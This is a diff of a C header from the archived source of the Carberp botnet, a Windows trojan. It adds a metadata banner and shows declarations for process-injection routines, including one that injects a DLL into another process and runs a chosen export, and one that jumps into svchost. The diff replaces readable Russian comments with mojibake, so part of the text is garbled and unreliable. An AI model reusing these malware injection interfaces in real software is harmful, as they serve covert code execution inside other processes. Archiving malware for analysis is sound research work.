@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef UUID_38DF963AD6BA4C53A9B00D570C9158C7
 #define UUID_38DF963AD6BA4C53A9B00D570C9158C7
 
@@ -35,13 +46,13 @@ bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) );
 PVOID RemouteAllocateImageDll(HANDLE hProcess,PVOID pDll);
 
 //
-//	Инжектирует длл в процесс.
-//	pDll		-	указатель на данные длл
-//	RunRoutine	-	имя експортируемой процедуры которою нужно выполнить.
-//		прототип:	VOID WINAPI Routine(PVOID Param); 
-//	Param		-	параметр, который получит 	RunRoutine
+//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//	pDll		-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//	RunRoutine	-	пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:	VOID WINAPI Routine(PVOID Param); 
+//	Param		-	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 	RunRoutine
 //
-//	Bозвращает  -   адрес загрузки длл
+//	BпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  -   пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //	
 PVOID InjectRemouteDll(HANDLE hProcess,PVOID pDll,PCHAR RunRoutine,DWORD Param);
 
